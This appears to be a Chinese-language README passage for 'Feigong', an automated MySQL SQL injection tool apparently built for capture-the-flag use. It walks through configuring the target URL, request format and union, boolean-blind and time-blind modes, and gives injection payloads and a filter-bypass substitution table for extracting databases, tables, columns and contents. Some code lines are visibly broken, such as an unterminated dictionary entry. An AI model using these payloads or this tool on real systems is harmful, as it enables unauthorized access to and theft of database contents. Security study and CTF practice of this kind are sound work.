            """
            self.content_count = 10
            """
            配置自定义替换表,合理的替换表配置远远可以替换出想要的所有情况payload
            """
            self.filter = {
                # padding 为填充字段，build与注入要求padding必须为真值
                'padding': 'user1',
                # 符号替换（url encode是get默认自带的，不需要修改）
                '\'': '\'',
                '\"': '\"',
                '&': '&',
                '|': '|',
                '>': '>',
                '\n %0b->\x0b
                '#': '#'  # --+
            }
            """
            初始化dealpayload类，传入self.sqlimethod，self.payload, self.requestformat, self.filter
            """
            self.dealpayload = ConPayload(self.sqlirequest, self.payload, self.requesetformat, self.filter, self.time)
Feigong现在的版本还仅仅支持对于mysql的3种注入方式： \- 普通注入（normal）：也就是会有返回的注入点 \-盲注（build）：没有返回，但可以通过真假条件来判断执行结果 \- 时间盲注（time）：没有返回，但是可以通过返回请求的间隔时间来判断真假
#### 基础配置
首先你需要进行基础的配置，首先是基础的目标url，请求头，传参方式，注入方式等...
    # 目标url
    self.url = 'http://demo.lorexxar.pw/get.php'
    self.s = requests.Session()
    # 请求头参数
    # cookies = {"username":data,"path":"/admin/","domain":"451bf8ea3268360ee.jie.sangebaimao.com"}
    # self.headers = {"Cookie": "username=" + data + "; captcha=od8lgg6f7i71q16j9rd7p7j9a2; username=" + data}
    self.headers = {}
    # 传参方式 0为GET 1为POST
    SqliRequest = (
        "GET",
        "POST"
    )
    self.sqlirequest = SqliRequest[0]
    # 注入方式 0为正常 1为盲注 2为时间盲注
    SqliMethod = (
        "normal",
        "build",
        "time"
    )
    self.sqlimethod = SqliMethod[0]
上面的每一步都给出了相应的参数，目标url中，不需要加上参数，关于参数的配置，我们会在后面进行...
ps:如果出现get和post请求都必须存在的情况，若注入点再post，可以直接把get请求代入到目标url中，如果反过来，则暂时不支持
#### 注入方式的配置
根据这一段的选择，我们会在后面进行不同的配置选项
    SqliMethod = (
        "normal",
        "build",
        "time"
    )
    self.sqlimethod = SqliMethod[0]
##### normal
如果注入模式为normal，需要定义基础payload
    self.payload = "padding' union all select 1,'Feigong' #"
normal注入的基础payload要求必须返回 **Feigong**
##### build
如果注入模式为build，则需要配置基础payload，设置真值是返回的页面长度
    若为build注入，则为与、或条件构造，如果是与注入，padding必须为返回值的条件
    eg: self.payload = "padding' && 2333 #"
对于真值时的返回长度,可自定义，也可以不定义，因为test.py中的test函数会自动设置self.len（使用基础payload）
     self.len = 0
##### time
如果注入模式为time，除了要设置基础payload以外，还需要设置睡眠时间，这部分在进阶配置中，默认为2
     self.time = 2
如果网络环境太差，建议（2-5）
若为time注入，则可以使用上面两种的任何一种，格式与其相符，同样，关键位置使用2333或者'Feigong'填充
    eg: self.payload = "padding' union all select 1,'Feigong' #"
    eg: self.payload = "padding' && 2333 #"
#### 配置请求格式
配置请求,把请求中payload的位置设置为Feigong（如果拼错了就会全部无效...）
    self.requesetformat = "user=Feigong&passwd=ddog123&submit=Log+In"
    self.requesetformat = {"user": "Feigong", "password": "a"}
上面两个分别是对于get和post请求的请求格式
#### 选择注入模式
在注入之前，你首先需要测试，test.py中包含所有的测试函数，包括test、get_now_database、get_version、get_user
self.wtest是是否进入测试模式、测试模式优先级最高和普通模式不兼容，默认开启
而testmethod则是选择使用那种测试，互相兼容可以同时跑
    self.wtest = True
    self.testmethod = {
        "test": 0,
        "database": 1,
        "version": 1,
        "user": 1
    }
在test成功后，就要开始正式的注入模式了...
正式注入模式的选择，test模式开启时，无论正式注入模式是否开启都无效，默认开启
content为注入数据，可以预设columns、tables和database，默认注入10条数据
columns为注入列名，可以预设tables和database tables为注入表名，可以预设database database为注入表名
统一规则为如果不预设，则自动调用上一层的类获取数据
    self.wsqli = True
    self.sqlilocation = {
        "content": 1,
        "columns": 1,
        "tables": 1,
        "database": 1
    }
#### 进阶配置
在进阶配置中，我们是可以通过预设值来减少注入的范围
database可以自定义，默认为空，若为空会调用get_database(),这里是一个列表，必须按照列表格式（当然，如果database_name错误...则不会注到数据）
    self.databases_name = ['hctfsqli1', 'test']
    self.databases_name = []
然后是table name，tables_name的格式为字典+元组(如果有写错某些值，则会注不到数据)
    self.tables_name = {'test': ('test',), 'hctfsqli1': ('hhhhctf', 'test', 'users')}
    self.tables_name = {}
然后是self.columns_name，columns_name的格式为字典套字典+元组(同样，如果有写错的值，则会注入不到数据)
    self.columns_name = {'test': {'test': ('test',)}, 'hctfsqli1': {'test': ('test1', 'testtest', 'flag1'), 'users': ('id', 'username'), 'hhhhctf': ('flag',)}}
    self.columns_name = {}
当选择注入content时，你需要指定输入数据的上限，默认为10
    self.content_count = 10
#### 配置自定义替换表
这部分一是在进阶配置中
配置自定义替换表,合理的替换表配置远远可以替换出想要的所有情况payload
合理的配置替换表，可以定制任意payload，例如 \- **#-- >group by a#** \- **sleep(2)-->benchmark(10000000,sha(1))**
总之，如果你对代码足够熟悉，可以生成任意payload
    self.filter = {
        # padding 为填充字段，build与注入要求padding必须为真值
        'padding': 'user',
        # 符号替换（url encode是get默认自带的，不需要修改）
        '\'': '\'',
        '\"': '\"',
        '&': '&',
        '|': '|',
        '>': '>',
        '\n %0b->\x0b
        '#': '#'    # --+
    }
#### 开始注入
开始注入
    python feigong.py
* * *